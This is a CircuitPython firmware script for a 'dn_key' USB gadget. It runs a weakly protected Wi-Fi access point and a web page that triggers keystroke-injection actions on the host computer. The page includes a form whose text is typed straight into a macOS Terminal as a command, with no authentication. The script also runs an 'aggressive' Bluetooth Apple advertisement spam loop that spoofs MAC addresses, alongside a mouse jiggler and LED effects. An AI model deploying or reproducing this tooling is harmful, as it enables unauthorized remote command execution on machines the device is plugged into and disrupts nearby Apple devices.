# This code creates a Wi-Fi access point (AP) named "dn_key" and serves a webpage that lets users trigger various actions.
# The AP's default IP address will be 192.168.4.1, which is automatically assigned by the firmware.
# Devices connected to the AP can access the web server via this IP address.
# The actions can be triggered by two touch pins or by pressing buttons on the webpage.
# One action runs a terminal command (e.g., cmatrix), another opens a specified webpage in Safari (iOS, macOS),
# another triggers a fire effect on the LED eyes, another toggles a mouse jiggler, and so on :)
# The LED eyes on the device provide varied visual feedback for Wi-Fi status, touch inputs, and web requests.
# Check the feedback in the serial monitor for debugging!


import time
import board
import random
import neopixel
import touchio
import wifi
import socketpool
import usb_hid
import _bleio
import struct
import asyncio
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode
from adafruit_hid.mouse import Mouse

# Setup LED pixels (for the eyes)
pixel_pin = board.EYES
num_pixels = 2
pixels = neopixel.NeoPixel(pixel_pin, num_pixels, brightness=0.08, auto_write=False)

# Define colors
green = (0, 255, 0)
red = (255, 0, 0)
blue = (0, 0, 255)
purple = (128, 0, 128)
white = (255, 255, 255)
pink = (255, 105, 180)

# Define colors for the fire effect
fire_colors = [
    (255, 69, 0),    # Red-Orange
    (255, 140, 0),   # Dark Orange
    (255, 165, 0),   # Orange
    (255, 99, 71),   # Tomato
    (255, 255, 0),   # Yellow
]

# Initialize touch pins
eyes_touch_pin = touchio.TouchIn(board.TOUCH1)
eyes_touch_pin.threshold = 30000

logo_touch_pin = touchio.TouchIn(board.TOUCH2)
logo_touch_pin.threshold = 30000

# Initialize USB HID devices (for keyboard and mouse emulation)
keyboard = Keyboard(usb_hid.devices)
keyboard_layout = KeyboardLayoutUS(keyboard)
mouse = Mouse(usb_hid.devices)

# State variables
do_mouse_jiggle = False
ble_spam_active = False

# Function to start WiFi AP
def start_wifi_ap():
    try:
        wifi.radio.start_ap(ssid="dn_key", password="12345678", channel=6)
        print("Access Point 'dn_key' started on channel 6")
        pixels.fill(green)
        pixels.show()
        return True
    except Exception as e:
        print(f"Failed to start Access Point: {e}")
        pixels.fill(red)
        pixels.show()
        return False

# Function to run cmatrix in Terminal
def run_cmatrix():
    keyboard.press(Keycode.COMMAND, Keycode.SPACE)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard_layout.write("terminal\n")
    time.sleep(1)
    keyboard_layout.write("cmatrix\n")
    keyboard.press(Keycode.RETURN)
    keyboard.release_all()

# Function to open Safari and navigate to a webpage
def open_safari():
    keyboard.press(Keycode.COMMAND, Keycode.SPACE)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard_layout.write("safari\n")
    time.sleep(1)
    keyboard.press(Keycode.COMMAND, Keycode.L)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard_layout.write("https://deepnet.store/pages/dn_key_s3")
    keyboard.press(Keycode.RETURN)
    keyboard.release_all()

# Function to create a fire-like effect for a specified duration
def fire_effect(duration=2):
    end_time = time.monotonic() + duration
    while time.monotonic() < end_time:
        color = random.choice(fire_colors)
        brightness = random.uniform(0.5, 1.0)
        pixels.brightness = brightness
        pixels.fill(color)
        pixels.show()
        time.sleep(0.1)
    pixels.fill(green)
    pixels.show()

# Function to toggle the mouse jiggler
def toggle_mouse_jiggler():
    global do_mouse_jiggle
    do_mouse_jiggle = not do_mouse_jiggle

async def mouse_jiggle_task():
    while True:
        if do_mouse_jiggle:
            x_direction = random.choice([-1, 1]) * random.randint(6, 10)
            y_direction = random.choice([-1, 1]) * random.randint(3, 10)
            mouse.move(x=x_direction, y=y_direction)
        await asyncio.sleep(0.5)

# Function to toggle BLE spam
def toggle_ble_spam():
    global ble_spam_active
    if ble_spam_active:
        print("Stopping BLE spam")
        _bleio.adapter.stop_advertising()
        ble_spam_active = False
    else:
        print("Starting BLE spam")
        ble_spam_active = True

# Function to spoof the MAC address
def spoof_mac_address():
    current_address = _bleio.adapter.address
    address_bytes = bytearray(reversed(current_address.address_bytes)) 

    address_bytes[0] = random.randint(0x00, 0x3e)
    address_bytes[1] = random.randint(0x00, 0x7f)
    address_bytes[2] = random.randint(0x00, 0xff)
    address_bytes[3] = random.randint(0, 255)
    address_bytes[4] = random.randint(0, 255)
    address_bytes[5] = random.randint(0, 255)

    new_address = _bleio.Address(bytes(reversed(address_bytes)), _bleio.Address.RANDOM_STATIC)
    return new_address

# Function to aggressively spam BLE advertisements
async def ble_spam_task():
    while True:
        if ble_spam_active:
            try:
                # Spoof MAC address periodically
                _bleio.adapter.address = spoof_mac_address()
                
                # Randomize advertisement data
                types = [0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0]
                bt_packet = bytes([16, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC1, random.choice(types),
                                random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), 
                                0x00, 0x00, 0x10, random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)])
                struct_params = [20, 20, 3, 0, 0, 0, 0, 0, 0, 0, 0, 7, 0]
                cmd_pkt = struct.pack("<HHBBB6BBB", *struct_params)
                
                # Start aggressive BLE advertising
                _bleio.adapter.stop_advertising()  # Ensure previous advertising is stopped
                _bleio.adapter.start_advertising(cmd_pkt, connectable=False, interval=0.05, tx_power=99)
                await asyncio.sleep(0.05)
                _bleio.adapter.stop_advertising()

                _bleio.adapter.start_advertising(bt_packet, connectable=False, interval=0.05, tx_power=99)
                await asyncio.sleep(0.05)
                _bleio.adapter.stop_advertising()

                # Additional noise packets
                _bleio.adapter.start_advertising(bytes([0x01]), connectable=False, interval=0.05, tx_power=99)
                await asyncio.sleep(0.05)
                _bleio.adapter.stop_advertising()

                _bleio.adapter.start_advertising(bytes([0x00]), connectable=False, interval=0.05, tx_power=99)
                await asyncio.sleep(0.05)
                _bleio.adapter.stop_advertising()

            except Exception as e:
                print(f"Error during BLE spam: {e}")
                _bleio.adapter.stop_advertising()
                await asyncio.sleep(0.5)  # Brief pause before trying again
        await asyncio.sleep(0.05)  # Maintain aggressive timing

# Function to execute a custom command in the Terminal
def execute_custom_command(command):
    keyboard.press(Keycode.COMMAND, Keycode.SPACE)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard_layout.write("terminal\n")
    time.sleep(1)
    keyboard_layout.write(f"{command}\n")
    keyboard.press(Keycode.RETURN)
    keyboard.release_all()

# Function to briefly turn LEDs purple
def flash_purple():
    pixels.fill(purple)
    pixels.show()
    time.sleep(1)
    pixels.fill(green)
    pixels.show()

def handle_request(request):
    request_line = request.splitlines()[0]
    request_method, path, _ = request_line.split()

    if path.startswith("/cmatrix"):
        print("Web request to run cmatrix")
        run_cmatrix()
        response = """\
HTTP/1.1 200 OK
Content-Type: text/html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="refresh" content="1; url=/" />
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>dn_key controls</title>
</head>
<body style="background-color: black; color: #00FF00; font-family: 'Courier New', Courier, monospace; text-align: center; padding: 20px;">
    <h1 style="color: #FF00FF; font-size: 24px;">Cmatrix command executed!</h1>
    <p>Redirecting to the main page...</p>
</body>
</html>
"""
    elif path.startswith("/safari"):
        print("Web request to open Safari")
        open_safari()
        response = """\
HTTP/1.1 200 OK
Content-Type: text/html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="refresh" content="1; url=/" />
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>dn_key controls</title>
</head>
<body style="background-color: black; color: #00FF00; font-family: 'Courier New', Courier, monospace; text-align: center; padding: 20px;">
    <h1 style="color: #FF00FF; font-size: 24px;">Safari command executed!</h1>
    <p>Redirecting to the main page...</p>
</body>
</html>
"""
    elif path.startswith("/fire"):
        print("Web request to trigger fire effect")
        fire_effect(5) # Set the timing of the fire effect here (5) seconds for example
        response = """\
HTTP/1.1 200 OK
Content-Type: text/html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="refresh" content="1; url=/" />
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>dn_key controls</title>
</head>
<body style="background-color: black; color: #00FF00; font-family: 'Courier New', Courier, monospace; text-align: center; padding: 20px;">
    <h1 style="color: #FF00FF; font-size: 24px;">Fire effect triggered!</h1>
    <p>Redirecting to the main page...</p>
</body>
</html>
"""
    elif path.startswith("/toggle_mouse"):
        print("Web request to toggle mouse jiggler")
        toggle_mouse_jiggler()
        response = """\
HTTP/1.1 200 OK
Content-Type: text/html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="refresh" content="1; url=/" />
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>dn_key controls</title>
</head>
<body style="background-color: black; color: #00FF00; font-family: 'Courier New', Courier, monospace; text-align: center; padding: 20px;">
    <h1 style="color: #FF00FF; font-size: 24px;">Mouse jiggler toggled!</h1>
    <p>Redirecting to the main page...</p>
</body>
</html>
"""
    elif path.startswith("/toggle_ble"):
        print("Web request to toggle BLE spam")
        toggle_ble_spam()
        response = """\
HTTP/1.1 200 OK
Content-Type: text/html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="refresh" content="1; url=/" />
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>dn_key controls</title>
</head>
<body style="background-color: black; color: #00FF00; font-family: 'Courier New', Courier, monospace; text-align: center; padding: 20px;">
    <h1 style="color: #FF00FF; font-size: 24px;">BLE spam toggled!</h1>
    <p>Redirecting to the main page...</p>
</body>
</html>
"""
    elif path.startswith("/execute_command"):
        cmd = request.split("cmd=")[-1].split(" ")[0]
        cmd_decoded = cmd.replace("+", " ")
        print(f"Web request to execute command: {cmd_decoded}")
        execute_custom_command(cmd_decoded)
        response = f"""\
HTTP/1.1 200 OK
Content-Type: text/html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="refresh" content="2; url=/" />
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>dn_key controls</title>
</head>
<body style="background-color: black; color: #00FF00; font-family: 'Courier New', Courier, monospace; text-align: center; padding: 20px;">
    <h1 style="color: #FF00FF; font-size: 24px;">Command '{cmd_decoded}' executed!</h1>
    <p>Redirecting to the main page in 2 seconds...</p>
</body>
</html>
"""
    else:
        response = """\
HTTP/1.1 200 OK
Content-Type: text/html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>dn_key controls</title>
</head>
<body style="background-color: black; color: #00FF00; font-family: 'Courier New', Courier, monospace; text-align: center; padding: 20px;">
    <h1 style="color: #FF00FF; font-size: 24px; margin-bottom: 20px;">dn_key controls</h1>
    <div style="display: flex; flex-direction: column; align-items: center;">
        <button style="background-color: black; color: #00FF00; border: 2px solid #FF00FF; padding: 15px; font-size: 18px; margin: 10px; cursor: pointer; width: 80%; max-width: 300px;" onclick="location.href='/cmatrix'">Run Cmatrix</button>
        <button style="background-color: black; color: #00FF00; border: 2px solid #FF00FF; padding: 15px; font-size: 18px; margin: 10px; cursor: pointer; width: 80%; max-width: 300px;" onclick="location.href='/safari'">Open Safari URL</button>
        <button style="background-color: black; color: #00FF00; border: 2px solid #FF00FF; padding: 15px; font-size: 18px; margin: 10px; cursor: pointer; width: 80%; max-width: 300px;" onclick="location.href='/fire'">Trigger Fire Effect</button>
        <button style="background-color: black; color: #00FF00; border: 2px solid #FF00FF; padding: 15px; font-size: 18px; margin: 10px; cursor: pointer; width: 80%; max-width: 300px;" onclick="location.href='/toggle_mouse'">Toggle Mouse Jiggler</button>
        <button style="background-color: black; color: #00FF00; border: 2px solid #FF00FF; padding: 15px; font-size: 18px; margin: 10px; cursor: pointer; width: 80%; max-width: 300px;" onclick="location.href='/toggle_ble'">Toggle BLE Apple Spam</button>
        <form action="/execute_command" method="get" style="margin-top: 20px;">
            <input type="text" name="cmd" placeholder="Enter command" style="width: 80%; max-width: 300px; padding: 10px; margin-bottom: 10px; background-color: black; color: #00FF00; border: 2px solid #FF00FF; font-size: 18px; text-align: center;">
            <button type="submit" style="background-color: black; color: #00FF00; border: 2px solid #FF00FF; padding: 10px; font-size: 18px; cursor: pointer;">Run Command</button>
        </form>
    </div>
</body>
</html>
"""
    flash_purple()
    return response

# Main loop for handling touch inputs and web requests
async def main_loop():
    while True:
        # Handle touch inputs
        if eyes_touch_pin.value:
            print("Eyes Touch Activated - Running cmatrix")
            pixels.fill(blue)
            pixels.show()
            run_cmatrix()
            while eyes_touch_pin.value:
                await asyncio.sleep(0.1)
            print("Eyes Touch Released")
            pixels.fill(green)
            pixels.show()

        if logo_touch_pin.value:
            print("DN Logo Touch Activated - Opening Safari")
            pixels.fill(blue)
            pixels.show()
            open_safari()
            while logo_touch_pin.value:
                await asyncio.sleep(0.1)
            print("DN Logo Touch Released")
            pixels.fill(green)
            pixels.show()

        # Handle web requests
        try:
            client, addr = server_socket.accept()
            print(f"Client connected from {addr}")
            buffer = bytearray(1024)
            client.recv_into(buffer)
            request = buffer.decode("utf-8")
            print(f"Request: {request}")

            response = handle_request(request)
            client.send(response.encode("utf-8"))
            client.close()

        except OSError as e:
            if e.errno != 11:
                raise e

        await asyncio.sleep(0.1)

# Start the WiFi AP
if start_wifi_ap():
    print("WiFi AP started successfully.")
else:
    print("WiFi AP failed to start.")
    while True:
        pass

# Set up the web server
pool = socketpool.SocketPool(wifi.radio)
server_socket = pool.socket(pool.AF_INET, pool.SOCK_STREAM)
server_socket.setsockopt(pool.SOL_SOCKET, pool.SO_REUSEADDR, 1)
server_socket.bind(("0.0.0.0", 80))
server_socket.listen(1)
server_socket.setblocking(False)

print("Web server started, listening for connections...")

# Run the main loop
asyncio.run(asyncio.gather(main_loop(), mouse_jiggle_task(), ble_spam_task()))

